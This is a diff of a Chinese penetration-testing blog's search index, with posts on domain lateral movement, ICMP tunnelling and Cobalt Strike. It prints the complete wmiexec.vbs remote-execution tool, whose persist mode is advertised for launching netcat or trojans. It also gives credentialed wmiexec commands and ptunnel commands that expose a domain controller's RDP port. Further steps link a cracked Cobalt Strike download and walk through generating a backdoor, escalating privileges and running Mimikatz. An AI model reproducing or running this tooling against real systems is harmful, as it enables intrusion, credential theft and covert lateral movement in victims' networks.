-<p><img src="/../../images/xdnwaq/1651757351430.png" alt="1651757351430"></p>
-<h3><span id="文件管理">文件管理</span></h3><p><img src="/../../images/xdnwaq/1651757885221.png" alt="1651757885221"></p>
-<h3><span id="提权">提权</span></h3><p> <a href="https://x1aojun.lanzoub.com/i8pau04c9iyd">提权插件下载</a> </p>
-<p><img src="/../../images/xdnwaq/1651758026432.png" alt="1651758026432"></p>
-<p><img src="/../../images/xdnwaq/1651757981862.png" alt="1651757981862"></p>
-<p>多了很多插件</p>
-<p><img src="/../../images/xdnwaq/1651758356708.png" alt="1651758356708"></p>
-]]></content>
-      <categories>
-        <category>小迪安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>小迪安全系列-[基础阶段]</title>
-    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5%5D/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>小迪安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>小迪安全系列-[内网渗透]</title>
     <url>/2022/05/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%5D%20/</url>
     <content><![CDATA[<p>[TOC]</p>
@@ -1544,7 +1386,7 @@
 <p>自带 cscript 明文传递 有回显<strong>（可过火绒）</strong><br> cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.0.2 administrator admin </p>
 <p><img src="/../../images/xdnwaq/1640022554523.png" alt="1640022554523"></p>
 <h2><span id="impacket-wmiexec">impacket wmiexec</span></h2><p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p>
-<p>wmiexec .&#x2F;administrator:<a href="mailto:&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#48;&#46;&#x32;">&#x61;&#100;&#109;&#x69;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#48;&#46;&#x32;</a> “whoami”</p>
+<p>wmiexec .&#x2F;administrator:<a href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x30;&#x2e;&#50;">&#x61;&#100;&#109;&#x69;&#110;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x30;&#x2e;&#50;</a> “whoami”</p>
 <p><img src="/../../images/xdnwaq/1640022650943.png" alt="1640022650943"></p>
 <h2><span id="wmiexec-vbs源码">wmiexec VBS源码：</span></h2><p> <a href="https://x1aojun.lanzoub.com/i2exe046vrji">https://x1aojun.lanzoub.com/i2exe046vrji</a> </p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">On Error Resume Next<br>&#x27;################################ Temp Result File , Change it to where you like<br>Const Path = &quot;C:\&quot;<br>Const FileName = &quot;wmi.dll&quot; <br>Const timeOut = 1200<br>&#x27;################################<br>file = Path &amp; &quot;\&quot; &amp; FileName<br>file = Replace(file,&quot;\\&quot;,&quot;\&quot;)<br>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>FilePath = fso.GetParentFolderName(file) &#x27;for wmi create share<br>&#x27;WScript.Echo FilePath<br><br>WAITTIME = timeOut              &#x27;ms  time to execute command ,read result file after 1200ms<br><br>Set objArgs = WScript.Arguments<br>intArgCount = objArgs.Count <br>If intArgCount &lt; 2 Or intArgCount &gt; 5 Then<br>	WScript.Echo <br>	WScript.Echo &quot;   $$\      $$\ $$\      $$\ $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  &quot;<br>	WScript.Echo &quot;   $$ | $\  $$ |$$$\    $$$ |\_$$  _|$$  _____|$$ |  $$ |$$  _____|$$  __$$\ &quot;<br>	WScript.Echo &quot;   $$ |$$$\ $$ |$$$$\  $$$$ |  $$ |  $$ |      \$$\ $$  |$$ |      $$ /  \__|&quot;<br>	WScript.Echo &quot;   $$ $$ $$\$$ |$$\$$\$$ $$ |  $$ |  $$$$$\     \$$$$  / $$$$$\    $$ |      &quot;<br>	WScript.Echo &quot;   $$$$  _$$$$ |$$ \$$$  $$ |  $$ |  $$  __|    $$  $$&lt;  $$  __|   $$ |      &quot;<br>	WScript.Echo &quot;   $$$  / \$$$ |$$ |\$  /$$ |  $$ |  $$ |      $$  /\$$\ $$ |      $$ |  $$\ &quot;<br>	WScript.Echo &quot;   $$  /   \$$ |$$ | \_/ $$ |$$$$$$\ $$$$$$$$\ $$ /  $$ |$$$$$$$$\ \$$$$$$  |&quot;<br>	WScript.Echo &quot;   \__/     \__|\__|     \__|\______|\________|\__|  \__|\________| \______/ &quot;<br>	WScript.Echo &quot;                                               v1.1dev        By. Twi1ight   &quot;<br>	WScript.Echo &quot; Usage:&quot; &amp; _<br>					vbTab &amp; &quot;wmiexec.vbs  /shell  host&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /shell  host  user  pass&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /cmd  host  command&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /cmd  host  user  pass  command&quot; &amp; vbNewLine &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  /shell&quot;  &amp; vbTab &amp; &quot;half-interactive shell mode&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  /cmd&quot; &amp; vbTab &amp; vbTab &amp; &quot;single command mode&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  host&quot; &amp; vbTab &amp; vbTab &amp; &quot;hostname or IP address&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  command&quot; &amp; vbTab &amp; &quot;the command to execute on remote host&quot; &amp; _<br>		vbNewLine &amp; vbNewLine &amp; vbTab &amp; &quot;  -waitTIME&quot; &amp; vbTab &amp; _<br>		 &quot;[both mode] ,delay TIME to read result,&quot;&amp; vbNewLine &amp; vbTab &amp; _<br>		 vbTab &amp; vbTab &amp;&quot;eg. &#x27;systeminfo -wait5000&#x27; &#x27;ping google.com -wait2000&#x27;&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  -persist&quot; &amp; vbTab &amp; _<br>		 &quot;[both mode] ,running command background and persistent&quot; &amp; vbNewLine &amp; vbTab &amp; _<br>		 vbTab &amp; vbTab &amp;&quot;such as nc.exe or Trojan&quot; <br>	WScript.Quit()<br>End If<br><br>If LCase(objArgs.Item(0)) &lt;&gt; &quot;/cmd&quot; And LCase(objArgs.Item(0)) &lt;&gt; &quot;/shell&quot; Then <br>	WScript.Echo &quot;WMIEXEC ERROR: Wrong Mode Specified!&quot;<br>	WScript.Quit<br>End If<br>boolShellMode = True<br>If LCase(objArgs.Item(0)) = &quot;/cmd&quot; Then boolShellMode = False<br>If boolShellMode = False Then command = objArgs.Item(intArgCount - 1)<br><br>host = objArgs.Item(1)<br>If intArgCount &gt; 3 Then <br>	user = objArgs.Item(2)<br>	pass = objArgs.Item(3)<br>	Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>	strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; &quot;&quot;&quot; &amp; pass &amp; &quot;&quot;&quot; &quot; &amp; &quot;/user:&quot; &amp; user<br>	&#x27;WScript.Echo strNetUse<br>	objShell.Run strNetUse,0<br>End If<br>&#x27;Output Status<br>WScript.Echo &quot;WMIEXEC : Target -&gt; &quot; &amp; host<br>WScript.Echo &quot;WMIEXEC : Connecting...&quot;<br><br>Set objLocator = CreateObject(&quot;wbemscripting.swbemlocator&quot;)<br>If intArgCount &gt;2 Then<br>	set objWMIService = objLocator.connectserver(host,&quot;root/cimv2&quot;,user,pass)<br>Else<br>	Set objWMIService = objLocator.ConnectServer(host,&quot;root/cimv2&quot;)<br>End If<br>If Err.Number &lt;&gt; 0 Then<br>	WScript.Echo &quot;WMIEXEC ERROR: &quot; &amp; Err.Description <br>	WScript.Quit<br>End If<br>WScript.Echo &quot;WMIEXEC : Login -&gt; OK&quot;<br>WScript.Echo &quot;WMIEXEC : Result File -&gt; &quot; &amp; file<br><br>boolPersist = False<br>&#x27;Create Share<br>CreateShare()<br>CurrentFolder = Null<br>&#x27;-----single Command mode------<br>If boolShellMode = False Then<br>	WAITTIME = 5000<br>	WScript.Echo vbNewLine &amp; vbTab &amp; host &amp; &quot;  &gt;&gt;  &quot; &amp; command<br>	boolGetFolder = False<br>	strResult = PhraseCmd( command )<br>	&#x27;WScript.Echo strResult<br>	If strResult = &quot;persist&quot; Then<br>		boolPersist = True<br>		Exec command,&quot;nul&quot;<br>	Else<br>		Exec command, file<br>		ReadResult()<br>	End If<br>	If intArgCount &gt; 3 Then <br>		Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>		strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; /del&quot;<br>		objShell.Run strNetUse,0<br>	End If<br>	DeleteShare()<br>	WScript.Quit<br>End If<br>&#x27;------------------------------<br><br>&#x27;++++++++shell mode++++++++++++<br>&#x27;get current working directory<br>boolGetFolder = True<br>CurrentFolder = Exec(&quot;cd&quot;, file)<br><br>&#x27;WScript.Echo CurrentFolder<br>Do While True<br>	boolPersist = False<br>	WAITTIME = timeOut<br>	wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)<br>	command = wscript.stdin.ReadLine<br>	&#x27;press &#x27;Enter&#x27; directorly<br>	Do While command = &quot;&quot;<br>		wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)<br>		command = wscript.stdin.ReadLine<br>	Loop<br>	If LCase(Trim(command)) = &quot;exit&quot; Then Exit Do<br>	&#x27;If Not IsEmpty(command) Then <br>	&#x27;process &#x27;cd&#x27; command--------&gt;&gt;&gt;&gt;<br>	strResult = PhraseCmd( command )<br>	If strResult = &quot;cd&quot; Then <br>		command = command &amp; &quot; &amp; cd &quot;<br>		boolGetFolder = True<br>		DestFolder = Exec(command, file)<br>		If CurrentFolder = DestFolder Then <br>			WScript.Echo &quot;The system cannot find the path specified.&quot;<br>		Else<br>			CurrentFolder = DestFolder<br>		End If<br>	ElseIf strResult = &quot;persist&quot; Then<br>		boolPersist = True<br>		&#x27;WScript.Echo &quot;persist&quot;<br>		Exec command,&quot;nul&quot;<br>		&#x27;##########################################toDo<br>	&#x27;-----------&lt;&lt;&lt;&lt;<br>	Else<br>		On Error Resume Next<br>		err.clear<br>		Exec command, file<br>		ReadResult()<br>	    If err.number &lt;&gt; 0 Then wscript.echo( &quot;WMIEXEC ERROR: &quot; &amp; Err.Number &amp; &quot; &quot; &amp; err.description)<br>		Err.Clear<br>	    On Error Goto 0<br>	End If<br>loop<br><br>strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>Exec strDelFile,&quot;nul&quot;<br>If intArgCount &gt; 3 Then <br>	Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>	strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; /del&quot;<br>	objShell.Run strNetUse,0<br>End If<br>DeleteShare()<br><br>&#x27;#####################################<br>Function PhraseCmd(cmd)<br>	PhraseCmd = False &#x27; not &#x27;cd&#x27;<br>	arrCommand = Split(cmd)<br>	strExe = arrCommand(0)<br>	If LCase(Trim(strExe)) = &quot;cd&quot; Or LCase(Trim(strExe)) = &quot;cd.exe&quot; Then PhraseCmd = &quot;cd&quot;  &#x27; is &#x27;cd&#x27;<br>	Set regEx = New RegExp<br>	regEx.Pattern = &quot;^[a-z]:$&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then PhraseCmd = &quot;cd&quot; &#x27; is &#x27;d:&#x27;<br>	&#x27;phrase time command<br>	regEx.Pattern = &quot;(.*?)-wait(\d+)&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then <br>		Set objMatch = Matches(0)<br>		command = objMatch.SubMatches(0)<br>		&#x27;WScript.Echo &quot;Command :&quot; &amp; command<br>		WAITTIME = CInt(objMatch.SubMatches(1))<br>		WScript.Echo &quot;WMIEXEC : Waiting &quot; &amp; WAITTIME &amp; &quot; ms...&quot; &amp; vbNewLine<br>	End If<br>	&#x27;phrase persist command<br>	regEx.Pattern = &quot;(.*?)-persist&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then <br>		Set objMatch = Matches(0)<br>		command = objMatch.SubMatches(0)<br>		PhraseCmd = &quot;persist&quot;  &#x27; is quiet<br>	End If<br>End Function<br><br>Function CreateShare()<br>	&#x27;create share<br>	Set objNewShare = objWMIService.Get(&quot;Win32_Share&quot;)<br>	intReturn = objNewShare.Create _<br>	    (FilePath, &quot;WMI_SHARE&quot;, 0, 25, &quot;&quot;)<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Share could not be created.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>	    	Case 9<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Invalid File Path!&quot;<br>	    	Case 22<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Share Name Already In Used!&quot;<br>	    	Case 24<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Directory NOT exists!&quot;<br>	    End Select<br>		If intReturn &lt;&gt; 22 Then WScript.Quit<br>	Else<br>	    WScript.Echo &quot;WMIEXEC : Share created sucess.&quot;<br>		WScript.Echo &quot;WMIEXEC : Share Name -&gt; WMI_SHARE&quot;<br>		WScript.Echo &quot;WMIEXEC : Share Path -&gt; &quot; &amp; FilePath<br>	End If<br>End Function<br><br>Function DeleteShare()<br>	Set colShares = objWMIService.ExecQuery _<br>		(&quot;Select * from Win32_Share Where Name = &#x27;WMI_SHARE&#x27;&quot;)<br>	For Each objShare In colShares<br>		intReturn = objShare.Delete<br>	Next<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Delete Share failed.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>	    	Case 25<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Share Not Exists!&quot;<br>	    End Select<br>	Else<br>	    WScript.Echo &quot;WMIEXEC : Share deleted sucess.&quot;<br>	End If<br>End Function<br><br>Function Exec(cmd, file)<br>	Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)<br>	Set objConfig = objStartup.SpawnInstance_<br>	objConfig.ShowWindow = 12<br>	<br>	Set objProcess=objWMIService.get(&quot;Win32_Process&quot;)<br>	strExec = &quot;cmd.exe /c &quot; &amp; cmd &amp; &quot; &gt; &quot; &amp; file &amp; &quot; 2&gt;&amp;1&quot;  &#x27;2&gt;&amp;1 err<br>	If boolPersist Then<br>		strExec = cmd<br>		intPath = InStr(cmd,&quot;\&quot;)<br>		If intPath = 0 Then strExec = CurrentFolder &amp; &quot;\&quot; &amp; strExec<br>	End If<br>	&#x27;WScript.Echo strExec<br>	intReturn = objProcess.Create _<br>	    (strExec, CurrentFolder, objConfig, intProcessID)  &#x27;Add CurrentFolder (strExec, Null, objConfig, intProcessID)<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Process could not be created.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Command -&gt; &quot; &amp; cmd &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>			Case 3<br>				WScript.Echo &quot;WMIEXEC ERROR: Insufficient Privilege!&quot;<br>	    	Case 9<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Path Not Found!&quot;<br>	    End Select<br>	Else<br>&#x27;	    WScript.Echo &quot;Process created.&quot; &amp; _<br>&#x27;	        vbNewLine &amp; &quot;Command: &quot; &amp; cmd &amp; _<br>&#x27;	        vbNewLine &amp; &quot;Process ID: &quot; &amp; intProcessID<br>		If boolPersist Then WScript.Echo &quot;WMIEXEC : Process created. PID: &quot;&amp; intProcessID<br>	    If boolGetFolder = True Then <br>	    	boolGetFolder = False<br>	    	Exec = GetCurrentFolder()<br>	    	Exit Function<br>	    End If<br>	    &#x27;ReadResult()<br>	End If<br>End Function<br><br>Function ReadResult()<br>	WScript.Sleep(WAITTIME)<br>	UNCFilePath = &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName<br>	Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>	Set objFile = fso.OpenTextFile(UNCFilePath, 1)<br>	If Not objFile.AtEndOfStream Then strContents = objFile.ReadAll<br>	objFile.Close<br>	WScript.Echo strContents<br>	&#x27;fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder<br>	strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>	Exec strDelFile,&quot;nul&quot;<br>End Function<br><br>Function GetCurrentFolder()<br>	WScript.Sleep(WAITTIME)<br>	UNCFilePath = &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName<br>	Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>	Set objFile = fso.OpenTextFile(UNCFilePath, 1)<br>	GetCurrentFolder = objFile.ReadLine<br>	objFile.Close<br>	strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>	Exec strDelFile,&quot;nul&quot;<br>End Function<br></code></pre></td></tr></table></figure>
@@ -1559,85 +1401,13 @@
       </categories>
   </entry>
   <entry>
-    <title>小迪安全系列-[隧道技术]</title>
-    <url>/2022/05/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%5D/</url>
-    <content><![CDATA[<h1><span id="域横向内网漫游-socks-代理隧道技术"><strong>域横向内网漫游 Socks 代理隧道技术</strong></span></h1><p><img src="/../../images/xdnwaq/165174493307521.png" alt="1651793307521"></p>
-<p>必备知识点:<br><strong>1.代理和隧道技术区别?</strong></p>
-<blockquote>
-<p><strong>代理解决网络通讯问题</strong></p>
-</blockquote>
-<blockquote>
-<p><strong>隧道绕过端口屏蔽的通讯方式，如果防火墙拦截某个协议，端口，那么利用隧道技术改变通信协议进行绕过拦截</strong></p>
-</blockquote>
-<p><strong>2.隧道技术为了解决什么?</strong></p>
-<blockquote>
-<p><strong>为了解决某些协议，端口被防火墙拦截，通过隧道技术改变通信协议进行绕过，单独的通道来传输被拦截的东西</strong></p>
-</blockquote>
-<p><strong>3.隧道技术前期的必备条件?</strong></p>
-<blockquote>
-<p><strong>在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截</strong><br><strong>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</strong></p>
-</blockquote>
-<blockquote>
-<p><strong>隧道：在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢?这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</strong></p>
-</blockquote>
-<p><strong>常用的隧道技术有以下三种:</strong></p>
-<blockquote>
-<p><strong>网络层:IPv6隧道、ICMP隧道</strong></p>
-<p><strong>传输层:TCP隧道、UDP隧道、常规端口转发</strong></p>
-<p><strong>应用层:sSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</strong></p>
-</blockquote>
-<h1><span id="案例一网络传输应用层检测连通性">案例一：网络传输应用层检测连通性</span></h1><p>探针对方协议是否支持</p>
-<p>例如探针对方是否开启ICMP命令，我们只需要<code>ping</code>以下对方主机是否的到回显</p>
-<blockquote>
-<p>TCP协议 </p>
-<p>用瑞士军刀—netcat</p>
-<p>执行nc命令：nc <ip> &lt;端口&gt;</ip></p>
-</blockquote>
-<blockquote>
-<p>2.HTTP 协议</p>
-<p>用curl工具，执行curl &lt;IP地址：端口&gt;命令，如果远程主机开启了相对应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
-</blockquote>
-<blockquote>
-<p>ICMP协议</p>
-<p>用ping命令，执行ping &lt;IP地址&gt;&lt;&#x2F;域名&gt;</p>
-</blockquote>
-<blockquote>
-<p>DNS协议</p>
-<p>检测DNS连通性常用的命令是nslookup和did</p>
-<p><strong>nslookup是Windows自带的DNS探测命令</strong></p>
-<p><strong>dig是Linux系统自带的DNS探测命令</strong></p>
-</blockquote>
-<h1><span id="案例二网络层隧道ptunnel使用-检测利用">案例二：网络层隧道Ptunnel使用-检测,利用</span></h1><p><img src="/../../images/xdnwaq/1651814479104.png" alt="1651814479104"></p>
-<h2><span id="pingtunnel基础命令">Pingtunnel基础命令：</span></h2><p>pingtunnel是把TCP&#x2F;UDP&#x2F;SOCK5流量伪装成ICMP流量进行转发的工具</p>
-<p>老版本：<a href="https://github.com/esrrhs/pingtunnel/releases">https://github.com/esrrhs/pingtunnel/releases</a></p>
-<p> <a href="https://x1aojun.lanzoub.com/iW8uh04fawwj">蓝奏云</a>  密码:biuh </p>
-<blockquote>
-<p><strong>-x ：指定ICMP隧道连接的验证密码</strong><br><strong>-lp：指定要监听的本地TCP端口</strong><br><strong>-da：指定要转发的目标机器的IP地址</strong><br><strong>-dp：指定要转发的目标机器的TCP端口</strong><br><strong>-p：指定ICMP隧道连一段的IP地址</strong></p>
-</blockquote>
-<h2><span id="kali安装"><strong>Kali安装</strong></span></h2><p> git clone <a href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
-<p>或者： </p>
-<p>wget <a href="http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz">http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</a><br>tar zxvf libpcap-1.9.0.tar.gz </p>
-<p><a href="https://blog.csdn.net/markecheng/article/details/110352161">安装参考</a></p>
-<p>解析：Hacker控制了Webserver，同时web server有两块网卡，一个通向外网，一个通向内网</p>
-<p>目的：Hacker控制webserver，通过控制webserver远程打开Dc的3389给外网的Hacker，并且不使用TCP协议</p>
-<p><img src="/../../images/xdnwaq/1651814479104.png" alt="1651814479104"></p>
-<p>.&#x2F;ptunnel -x admin</p>
-<p>.&#x2F;ptunnel -p  webserverIP -lp Hacker端口 -da DcIP -dp DC的3389 -x 连接密码</p>
-<h1><span id="案例三-传输层转发隧道portmap使用-检测利用">案例三-传输层转发隧道Portmap使用-检测,利用</span></h1>]]></content>
-      <categories>
-        <category>小迪安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>渗透工具-[CobaltStrike]</title>
-    <url>/2022/05/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-%5BCobaltStrike%5D%20/</url>
-    <content><![CDATA[<h1><span id="cobaltstrike40环境配置及使用">CobaltStrike4.0环境配置及使用</span></h1><h1><span id="cobaltstrike简介">Cobaltstrike简介</span></h1><blockquote>
-<p><strong>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS，其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。分为服务端（teamserver）和客户端，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。客户端可在windows上运行，服务端必须在Linux上，且两者都需Java环境。</strong></p>
-</blockquote>
-<h1><span id="环境搭建">环境搭建</span></h1><h2><span id="环境搭建">环境搭建</span></h2><p> <strong>下载：<a href="https://zhiji.lanzoui.com/iYOvjp5hqra">CobaltStrike4.0</a> 密码：cs66</strong> </p>
+    <title>小迪安全系列-[内网渗透进阶]</title>
+    <url>/2022/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BF%9B%E9%98%B6%5D/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<h1><span id="一域横向-cobaltstrikeampspnamprdp">一,域横向 CobaltStrike&amp;SPN&amp;RDP</span></h1><h2><span id="域横向移动测试流程一把梭-cs初体验">域横向移动测试流程一把梭-CS初体验</span></h2><p> 下载：<a href="https://zhiji.lanzoui.com/iYOvjp5hqra">CobaltStrike4.0</a> 密码：cs66 </p>
 <blockquote>
 <p><strong>客户端：win10（自己的主机）</strong></p>
-<p><strong>服务端： ubuntu 20.04（国外vps服务器）</strong></p>
+<p><strong>服务端： Kali</strong></p>
 </blockquote>
 <p>安装java环境<br>客户端windows的java环境配置可以看我前面的文章，这里就不再赘述，下面介绍服务端的配置</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入根目录</span><br>cd /<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java是否安装</span><br>java -version<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装java</span><br>apt install openjdk-14-jre-headless<br><br></code></pre></td></tr></table></figure>
@@ -1656,15 +1426,109 @@
 
 
 
-<h3><span id="启动服务端">启动服务端</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给权限</span><br>chmod 777 ./teamserver<br><span class="hljs-meta prompt_">#</span><span class="language-bash">启动服务端</span><br>./teamserver vps的ip 连接密码<br></code></pre></td></tr></table></figure>
+<h2><span id="启动服务端">启动服务端</span></h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给权限</span><br>chmod 777 ./teamserver<br><span class="hljs-meta prompt_">#</span><span class="language-bash">启动服务端</span><br>./teamserver vps的ip 连接密码<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/xdnwaq/1651669739393.png" alt="1651669739393"></p>
-<h3><span id="客户端连接">客户端连接</span></h3><p>这里只需要将host修改为服务器端的ip地址，端口50050固定不（端口确保开启），用户名可以随便起，密码必须写服务器端的密码。</p>
-<p>连接成功，服务端搭建完毕</p>
+<h2><span id="客户端连接">客户端连接</span></h2><p>这里只需要将host修改为服务器端的ip地址，端口50050固定不（端口确保开启），用户名可以随便起，密码必须写服务器端的密码。</p>
+<p><strong>连接成功，服务端搭建完毕</strong></p>
 <p><img src="/../../images/xdnwaq/1640500886850.png" alt="1640500886850"></p>
+<h1><span id="cobaltstrike利用">CobaltStrike利用</span></h1><h3><span id="翻译">翻译</span></h3><p><img src="/../../images/xdnwaq/1651757827302.png" alt="1651757827302"></p>
+<p><img src="/../../images/xdnwaq/1651757843156.png" alt="1651757843156"></p>
+<h2><span id="主机上线">主机上线</span></h2><h3><span id="配置监听器">配置监听器</span></h3><p><img src="/../../images/xdnwaq/165168350233655.png" alt="1651683502336"></p>
+<p><img src="/../../images/xdnwaq/164050146705546.png" alt="1640501467046"></p>
+<p><img src="/../../images/xdnwaq/1651684006980.png" alt="1651684006980"></p>
+<h3><span id="配置后门木马">配置后门木马</span></h3><p><img src="/../../images/xdnwaq/1651683848651.png" alt="1651683848651"></p>
+<h3><span id="生成木马">生成木马</span></h3><p><img src="/../../images/xdnwaq/1651684126849.png" alt="1651684126849"></p>
+<h3><span id="主机上线成功">主机上线成功</span></h3><p><strong><img src="/../../images/xdnwaq/1651684932069.png" alt="1651684932069"></strong></p>
+<h2><span id="提权">提权</span></h2><h3><span id="提权插件">提权插件</span></h3><p>上传插件后，单机UnIoad</p>
+<p><img src="/../../images/xdnwaq/1651706907877.png" alt="1651706907877"></p>
+<h3><span id="提权配置">提权配置</span></h3><p><img src="/../../images/xdnwaq/16517072374002.png" alt="1651707237002"></p>
+<h3><span id="提权成功">提权成功</span></h3><p><img src="/../../images/xdnwaq/1651707405682.png" alt="1651707405682"></p>
+<h2><span id="信息收集命令">信息收集命令</span></h2><h3><span id="getuid查看系统权限">getuid查看系统权限</span></h3><p><img src="/../../images/xdnwaq/1651707774341.png" alt="1651707774341"></p>
+<h2><span id="net-view查看网络拓扑">net view查看网络拓扑</span></h2><p><img src="/../../images/xdnwaq/1651707917280.png" alt="1651707917280"></p>
+<p>当我们信息收集太多时，会显得很杂乱，通过Targets菜单获取所有探针过的主机</p>
+<p><img src="/../../images/xdnwaq/1651708048992.png" alt="1651708048992"></p>
+<h3><span id="执行minikatz">执行MInikatz</span></h3><p><img src="/../../images/xdnwaq/1651756948323.png" alt="1651756948323"></p>
